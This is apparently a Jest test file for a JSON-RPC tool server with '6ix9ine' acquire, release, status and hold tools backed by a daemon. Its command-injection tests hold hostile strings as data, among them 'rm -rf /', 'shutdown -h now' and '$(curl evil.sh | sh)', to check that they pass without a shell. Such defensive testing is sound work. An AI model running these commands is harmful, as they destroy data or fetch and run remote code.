import { jest } from "@jest/globals"
import { connect, AddressInfo } from "node:net"

// Prevent MaxListeners warnings from transports registering SIGTERM/SIGINT.
process.setMaxListeners(100)

jest.mock("../../shared/daemon-client", () => ({
  acquire: jest.fn(),
  release: jest.fn(),
  status: jest.fn(),
  hold: jest.fn(),
  isDaemonReachable: jest.fn().mockReturnValue(true),
  daemonSocketPath: jest.fn().mockReturnValue("/tmp/mock.sock"),
}))

type AnyMock = jest.Mock<(...args: any[]) => any>
const mockClient = jest.requireMock("../../shared/daemon-client") as {
  acquire: AnyMock
  release: AnyMock
  status: AnyMock
  hold: AnyMock
  isDaemonReachable: AnyMock
  daemonSocketPath: AnyMock
}

import {
  CLIENTS,
  registerClient,
  handleMessage,
  handleToolCall,
  releaseClientSessions,
  createLineBuffer,
  scanClaudeSessions,
  startTcp,
  startStdio,
  startIdleReaper,
  main,
} from "../server"
import { TOOLS, RESOURCES, getCapabilities } from "../handlers"

beforeEach(() => {
  jest.clearAllMocks()
  mockClient.acquire.mockResolvedValue({ ok: true, status: "ACTIVE", count: 1 })
  mockClient.release.mockResolvedValue({ ok: true, status: "IDLE", count: 0 })
  mockClient.status.mockResolvedValue({ ok: true, status: "ACTIVE", count: 1 })
  mockClient.hold.mockResolvedValue({ ok: true, hold_id: "hold-abc" })
  mockClient.isDaemonReachable.mockReturnValue(true)
  CLIENTS.clear()
})

afterEach(() => {
  CLIENTS.clear()
})

const req = (id: unknown, method: string, params?: unknown): Record<string, unknown> => ({
  jsonrpc: "2.0",
  ...(id !== undefined ? { id } : {}),
  method,
  ...(params ? { params } : {}),
})

describe("JSON-RPC framing (BLOCKING-1: id echoing)", () => {
  it("echoes a numeric request id on the response", async () => {
    registerClient("c")
    const resp = await handleMessage(req(42, "initialize"), "c")
    expect(resp).not.toBeNull()
    expect(resp!.id).toBe(42)
    expect((resp!.result as any).protocolVersion).toBe("2025-03-26")
  })

  it("echoes a string request id on the response", async () => {
    registerClient("c")
    const resp = await handleMessage(req("abc-123", "tools/list"), "c")
    expect(resp!.id).toBe("abc-123")
  })

  it("rejects a non-2.0 jsonrpc envelope", async () => {
    const resp = await handleMessage({ jsonrpc: "1.0", id: 1, method: "initialize" }, "c")
    expect((resp!.error as any).code).toBe(-32600)
  })

  it("rejects a request missing a method", async () => {
    const resp = await handleMessage({ jsonrpc: "2.0", id: 1 }, "c")
    expect((resp!.error as any).code).toBe(-32600)
  })

  it("rejects a non-notification request that omits an id", async () => {
    const resp = await handleMessage(req(undefined, "initialize"), "c")
    expect((resp!.error as any).message).toMatch(/must include id/)
  })

  it("returns -32601 for an unknown method", async () => {
    registerClient("c")
    const resp = await handleMessage(req(9, "does/not/exist"), "c")
    expect((resp!.error as any).code).toBe(-32601)
  })

  it("returns null (no response) for a notification", async () => {
    registerClient("c")
    const resp = await handleMessage(req(undefined, "notifications/initialized"), "c")
    expect(resp).toBeNull()
  })
})

describe("capability & resource advertisement", () => {
  it("tools/list returns the four tools", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "tools/list"), "c")
    const names = (resp!.result as any).tools.map((t: any) => t.name)
    expect(names).toEqual([
      "6ix9ine_acquire",
      "6ix9ine_release",
      "6ix9ine_status",
      "6ix9ine_hold",
    ])
  })

  it("resources/list returns the status resource", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "resources/list"), "c")
    expect((resp!.result as any).resources[0].uri).toBe("6ix9ine://status")
  })

  it("resources/read returns daemon status for the known uri", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "resources/read", { uri: "6ix9ine://status" }), "c")
    expect((resp!.result as any).contents[0].text).toContain("ACTIVE")
  })

  it("resources/read rejects an unknown uri", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "resources/read", { uri: "file:///etc/passwd" }), "c")
    expect((resp!.error as any).code).toBe(-32602)
  })

  it("resources/subscribe is acknowledged", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "resources/subscribe", { uri: "6ix9ine://status" }), "c")
    expect(resp!.result).toEqual({})
  })
})

describe("schema consistency (BLOCKING-4: single source of truth)", () => {
  it("tools/list advertises the exact TOOLS array from handlers.ts", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "tools/list"), "c")
    expect((resp!.result as any).tools).toBe(TOOLS)
  })

  it("initialize advertises exactly getCapabilities()", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "initialize"), "c")
    expect(resp!.result).toEqual(getCapabilities())
  })

  it("resources/list advertises the exact RESOURCES array from handlers.ts", async () => {
    registerClient("c")
    const resp = await handleMessage(req(1, "resources/list"), "c")
    expect((resp!.result as any).resources).toBe(RESOURCES)
  })
})

describe("tool dispatch (BLOCKING-4: delegates to handlers.ts)", () => {
  it("acquire tracks the session against the client for auto-release", async () => {
    registerClient("c")
    const resp = await handleToolCall(1, "6ix9ine_acquire", { session_id: "s1", reason: "work" }, "c")
    expect(mockClient.acquire).toHaveBeenCalledWith("s1", "work")
    expect((resp.result as any).isError).toBeFalsy()
    expect(CLIENTS.get("c")!.sessions.has("s1")).toBe(true)
  })

  it("acquire without a session_id returns an error and tracks nothing", async () => {
    registerClient("c")
    const resp = await handleToolCall(1, "6ix9ine_acquire", {}, "c")
    expect((resp.result as any).isError).toBe(true)
    expect(CLIENTS.get("c")!.sessions.size).toBe(0)
  })

  it("acquire surfaces a daemon error", async () => {
    mockClient.acquire.mockResolvedValue({ ok: false, error: "unknown agent" })
    registerClient("c")
    const resp = await handleToolCall(1, "6ix9ine_acquire", { session_id: "s1" }, "c")
    expect((resp.result as any).isError).toBe(true)
  })

  it("release removes the tracked session", async () => {
    registerClient("c")
    await handleToolCall(1, "6ix9ine_acquire", { session_id: "s1" }, "c")
    const resp = await handleToolCall(2, "6ix9ine_release", { session_id: "s1" }, "c")
    expect(mockClient.release).toHaveBeenCalledWith("s1")
    expect((resp.result as any).isError).toBeFalsy()
    expect(CLIENTS.get("c")!.sessions.has("s1")).toBe(false)
  })

  it("release surfaces a daemon error other than 'session not found'", async () => {
    mockClient.release.mockResolvedValue({ ok: false, error: "daemon down" })
    registerClient("c")
    const resp = await handleToolCall(1, "6ix9ine_release", { session_id: "s1" }, "c")
    expect((resp.result as any).isError).toBe(true)
    expect((resp.result as any).content[0].text).toMatch(/daemon down/)
  })

  it("hold surfaces a daemon error", async () => {
    mockClient.hold.mockResolvedValue({ ok: false, error: "bad duration" })
    const resp = await handleToolCall(1, "6ix9ine_hold", { duration: "xx", reason: "r" }, "c")
    expect((resp.result as any).isError).toBe(true)
    expect((resp.result as any).content[0].text).toMatch(/bad duration/)
  })

  it("status returns daemon state", async () => {
    const resp = await handleToolCall(1, "6ix9ine_status", {}, "c")
    expect((resp.result as any).content[0].text).toContain("ACTIVE")
  })

  it("hold with valid args succeeds; missing args error", async () => {
    const ok = await handleToolCall(1, "6ix9ine_hold", { duration: "30m", reason: "build" }, "c")
    expect(mockClient.hold).toHaveBeenCalledWith("30m", "build")
    expect((ok.result as any).isError).toBeFalsy()

    const bad = await handleToolCall(2, "6ix9ine_hold", { duration: "30m" }, "c")
    expect((bad.result as any).isError).toBe(true)
  })

  it("returns an error for an unknown tool", async () => {
    const resp = await handleToolCall(1, "nope", {}, "c")
    expect((resp.result as any).isError).toBe(true)
    expect((resp.result as any).content[0].text).toMatch(/unknown tool/)
  })

  it("catches internal errors thrown by the daemon layer", async () => {
    mockClient.acquire.mockRejectedValue(new Error("boom"))
    registerClient("c")
    const resp = await handleToolCall(1, "6ix9ine_acquire", { session_id: "s1" }, "c")
    expect((resp.result as any).isError).toBe(true)
    expect((resp.result as any).content[0].text).toMatch(/internal error/)
  })
})

describe("command injection safety (BLOCKING-2)", () => {
  it("passes a shell-metacharacter reason verbatim to the daemon (no shell)", async () => {
    registerClient("c")
    const payload = 'work"; rm -rf / $(whoami) `id` && echo pwned'
    await handleToolCall(1, "6ix9ine_acquire", { session_id: "s1", reason: payload }, "c")
    expect(mockClient.acquire).toHaveBeenCalledWith("s1", payload)
  })

  it("passes a malicious hold duration/reason verbatim (structured args)", async () => {
    const dur = "30m; shutdown -h now"
    const reason = "$(curl evil.sh | sh)"
    await handleToolCall(1, "6ix9ine_hold", { duration: dur, reason }, "c")
    expect(mockClient.hold).toHaveBeenCalledWith(dur, reason)
  })
})

describe("multi-client concurrency & disconnect auto-release", () => {
  it("keeps two clients' sessions isolated when acquired concurrently", async () => {
    registerClient("c1")
    registerClient("c2")
    await Promise.all([
      handleToolCall(1, "6ix9ine_acquire", { session_id: "sess-1" }, "c1"),
      handleToolCall(2, "6ix9ine_acquire", { session_id: "sess-2" }, "c2"),
    ])
    expect(CLIENTS.get("c1")!.sessions.has("sess-1")).toBe(true)
    expect(CLIENTS.get("c1")!.sessions.has("sess-2")).toBe(false)
    expect(CLIENTS.get("c2")!.sessions.has("sess-2")).toBe(true)
  })

  it("releases all of a client's sessions on disconnect and forgets the client", async () => {
    registerClient("c3")
    await handleToolCall(1, "6ix9ine_acquire", { session_id: "sess-3" }, "c3")
    const n = releaseClientSessions("c3")
    expect(n).toBe(1)
    expect(mockClient.release).toHaveBeenCalledWith("sess-3")
    expect(CLIENTS.has("c3")).toBe(false)
  })

  it("releasing an unknown client is a no-op", () => {
    expect(releaseClientSessions("ghost")).toBe(0)
  })
})

describe("createLineBuffer", () => {
  it("emits one callback per complete newline-delimited line and buffers partials", () => {
    const lines: string[] = []
    const feed = createLineBuffer((l) => lines.push(l))
    feed(Buffer.from('{"a":1}\n{"b":2}\n{"c'))
    feed(Buffer.from('":3}\n\n'))
    expect(lines).toEqual(['{"a":1}', '{"b":2}', '{"c":3}'])
  })
})

describe("scanClaudeSessions", () => {
  it("returns an array without throwing when the sessions dir is absent", () => {
    expect(Array.isArray(scanClaudeSessions())).toBe(true)
  })
})

describe("startIdleReaper", () => {
  it("releases sessions that exceed the idle timeout", () => {
    jest.useFakeTimers()
    try {
      registerClient("reap")
      CLIENTS.get("reap")!.sessions.set("old", {
        sessionId: "old",
        acquiredAt: Date.now() - 10_000_000,
        clientId: "reap",
      })
      const timer = startIdleReaper()
      jest.advanceTimersByTime(60_000)
      expect(mockClient.release).toHaveBeenCalledWith("old")
      expect(CLIENTS.get("reap")!.sessions.size).toBe(0)
      clearInterval(timer)
    } finally {
      jest.useRealTimers()
    }
  })
})

describe("main", () => {
  it("exits with code 1 when the daemon is unreachable", () => {
    mockClient.isDaemonReachable.mockReturnValue(false)
    const exitSpy = jest.spyOn(process, "exit").mockImplementation((() => {
      throw new Error("exit")
    }) as never)
    try {
      expect(() => main()).toThrow("exit")
      expect(exitSpy).toHaveBeenCalledWith(1)
    } finally {
      exitSpy.mockRestore()
    }
  })
})

describe("startTcp (end-to-end over a real socket)", () => {
  it("accepts a JSON-RPC request, echoes the id, and releases on disconnect", async () => {
    const srv = startTcp(0)
    await new Promise<void>((resolve) => {
      if (srv.listening) resolve()
      else srv.once("listening", () => resolve())
    })
    const port = (srv.address() as AddressInfo).port

    const client = connect(port, "127.0.0.1")
    const response: string = await new Promise((resolve, reject) => {
      let buf = ""
      client.on("connect", () => {
        client.write(JSON.stringify({ jsonrpc: "2.0", id: 7, method: "initialize" }) + "\n")
        client.write(JSON.stringify({ jsonrpc: "2.0", id: 8, method: "tools/call", params: { name: "6ix9ine_acquire", arguments: { session_id: "tcp-s" } } }) + "\n")
      })
      client.on("data", (chunk) => {
        buf += chunk.toString("utf-8")
        if (buf.split("\n").filter((l) => l.trim()).length >= 2) resolve(buf)
      })
      client.on("error", reject)
    })

    const firstLine = JSON.parse(response.split("\n").filter((l) => l.trim())[0])
    expect(firstLine.id).toBe(7)
    expect(firstLine.result.protocolVersion).toBe("2025-03-26")

    // Disconnect should auto-release the acquired session.
    await new Promise<void>((resolve) => {
      client.end(() => resolve())
    })
    await new Promise((r) => setTimeout(r, 50))
    expect(mockClient.release).toHaveBeenCalledWith("tcp-s")

    await new Promise<void>((resolve) => srv.close(() => resolve()))
  })
})

describe("startStdio", () => {
  it("responds on stdout to a parse error and a valid request", async () => {
    const writes: string[] = []
    const writeSpy = jest
      .spyOn(process.stdout, "write")
      .mockImplementation(((s: string) => {
        writes.push(String(s))
        return true
      }) as never)
    try {
      startStdio()
      process.stdin.emit("data", Buffer.from("not-json\n"))
      process.stdin.emit("data", Buffer.from(JSON.stringify({ jsonrpc: "2.0", id: 5, method: "initialize" }) + "\n"))
      // allow the async onLine callbacks to settle
      await new Promise((r) => setTimeout(r, 20))
      const joined = writes.join("")
      expect(joined).toContain("parse error")
      expect(joined).toContain('"id":5')
    } finally {
      writeSpy.mockRestore()
      process.stdin.removeAllListeners("data")
      process.stdin.removeAllListeners("end")
      process.stdin.pause()
    }
  })
})
